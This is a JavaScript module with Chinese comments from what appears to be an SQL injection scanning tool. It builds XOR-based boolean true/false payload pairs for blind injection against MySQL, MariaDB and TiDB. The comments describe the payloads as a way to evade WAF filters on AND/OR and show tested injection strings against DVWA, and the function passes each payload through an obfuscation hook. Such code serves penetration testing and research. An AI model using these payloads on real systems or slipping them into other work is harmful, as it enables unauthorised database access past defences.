// ============================================================================
// xorPair.js —— [D308] XOR 布尔真假对构造（opt-in，默认关）
//
// 来源：社区 905 条 payload（PayloadsAllTheThings SQLi/Intruder）特征对账，
// 21 类语法特征中 19 类本仓覆盖，唯一真缺口 = XOR（出自 MySQL polyglot）。
//
// 真引擎语义（MariaDB 3306，DVWA users 表，D308 实测）：
//   `WHERE user_id='1' XOR 0-- -`  → 1 行（≈基线，取真）
//   `WHERE user_id='1' XOR 1-- -`  → 4 行（补集，取假）
// ⇒ XOR 0 / XOR 1 构成可分的真假对，且不含 AND/OR 关键字（绕过 WAF 过滤）。
// SQLite 真引擎报 `near "XOR": syntax error` ⇒ 只投 MySQL 家族。
// ============================================================================

/**
 * 构造 XOR 布尔对（在 boundary 感知对之后追加）。
 * @param {object} args { config, point, dbms, orig, obfuscate }
 * @returns {Array<object>} XOR 对（不满足条件时为空数组）
 */
export function xorBooleanPair({ config, point, dbms, orig, obfuscate }) {
  // 默认关：标准注入点 AND/OR 族已覆盖，XOR 只在 WAF 过滤 AND/OR 时有意义。
  if (config?.booleanXor !== true) return [];
  // 无闭合前缀会产生语法错误噪声（与 or_fallback 同口径）。
  if (!point?.boundary) return [];
  // XOR 仅 MySQL/MariaDB/TiDB 支持；其他方言投放只会产出语法错误。
  if (!/^(MySQL|MariaDB|TiDB)$/i.test(String(dbms || ''))) return [];
  return [{
    ti: -1,
    fi: -1,
    truePayload: obfuscate(`${orig}${point.boundary} XOR 0-- -`),
    falsePayload: obfuscate(`${orig}${point.boundary} XOR 1-- -`),
    id: 'xor_bool',
  }];
}
